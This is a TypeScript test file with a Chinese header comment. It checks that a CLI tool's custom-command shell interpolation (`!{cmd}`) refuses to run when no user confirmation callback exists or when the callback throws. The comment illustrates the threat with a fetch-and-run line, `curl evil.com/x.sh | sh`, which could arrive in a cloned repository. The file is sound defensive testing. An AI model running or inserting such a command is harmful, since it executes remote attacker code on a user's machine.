/**
 * 自定义命令 shell 注入 `!{cmd}` 的 fail-closed 测试（P2-3）。
 *
 * ## 修复的是取向，不是漏洞
 *
 * 修复前：`if (ctx.confirmShellCommands) { ...确认... }` —— 回调**没注入就整段跳过**，
 * 然后无条件 `execSync`。生产路径确实注入了真实弹窗（app.ts + adapter.ts 双向透传），
 * 所以今天没有一条用户路径会跳过确认，它不是活漏洞。
 *
 * 但 `!{cmd}` 是一个真实的代码执行面：`.sid-code/commands/` 随版本库分发，
 * clone 一个仓库就可能带进来一个 `!{curl evil.com/x.sh | sh}`。它的正确性依赖
 * **"每一条现在和将来的路径都记得注入那个回调"** —— 而同一个系统里 Skill 侧的
 * `resolveSkillAsk` 恰好是相反取向：三条兜底路径全部 `return false`，
 * 连"回调自己抛异常"都保守拒绝。同一个教训，一处放对了、一处放错了。
 *
 * 这份文件把安全从约定变成结构：**没有确认通道 = 拒绝执行**。
 */

import { describe, test, expect } from "bun:test";
import { CustomCommand } from "@sid-code/cli/command/custom.ts";
import type { AppContext } from "@sid-code/cli/command/types.ts";

/** 一个会留下可观测副作用的注入体：真被执行了就能看出来。 */
const TEMPLATE = "结果: !{echo INJECTED_MARKER}";

function ctxWith(over: Partial<AppContext> = {}): AppContext {
  return over as AppContext;
}

describe("P2-3 无确认通道 → 拒绝执行", () => {
  test("未注入 confirmShellCommands 时不执行 shell，且返回已取消", async () => {
    const cmd = new CustomCommand("t", "d", TEMPLATE);
    const r = await cmd.execute("", ctxWith()); // 刻意不给 confirmShellCommands

    // 修复前：这里会是 submit_prompt，且 prompt 里含 INJECTED_MARKER（命令已被执行）
    expect(r.kind).toBe("message");
    expect((r as { message: string }).message).toMatch(/已取消/);
    expect(JSON.stringify(r)).not.toContain("INJECTED_MARKER");
  });

  test("确认回调抛异常 → 保守拒绝（异常不等于放行）", async () => {
    const cmd = new CustomCommand("t", "d", TEMPLATE);
    const r = await cmd.execute(
      "",
      ctxWith({
        confirmShellCommands: async () => {
          throw new Error("弹窗渲染失败");
        },
      }),
    );
    expect(r.kind).toBe("message");
    expect((r as { message: string }).message).toMatch(/已取消/);
    expect(JSON.stringify(r)).not.toContain("INJECTED_MARKER");
  });
});

describe("P2-3 回归：生产路径行为与修复前完全一致", () => {
  test("用户确认 → 正常执行并注入输出", async () => {
    let asked: string[] = [];
    const cmd = new CustomCommand("t", "d", TEMPLATE);
    const r = await cmd.execute(
      "",
      ctxWith({
        confirmShellCommands: async (commands: string[]) => {
          asked = commands;
          return true;
        },
      }),
    );
    expect(r.kind).toBe("submit_prompt");
    expect((r as { prompt: string }).prompt).toContain("INJECTED_MARKER");
    // 确认弹窗拿到的是真实命令列表
    expect(asked).toEqual(["echo INJECTED_MARKER"]);
  });

  test("用户拒绝 → 不执行", async () => {
    const cmd = new CustomCommand("t", "d", TEMPLATE);
    const r = await cmd.execute("", ctxWith({ confirmShellCommands: async () => false }));
    expect(r.kind).toBe("message");
    expect(JSON.stringify(r)).not.toContain("INJECTED_MARKER");
  });

  test("模板不含 !{} 时不需要确认通道（不误拦无 shell 的普通命令）", async () => {
    const cmd = new CustomCommand("t", "d", "普通模板，没有 shell 注入");
    const r = await cmd.execute("", ctxWith()); // 无回调也应放行
    expect(r.kind).toBe("submit_prompt");
  });
});
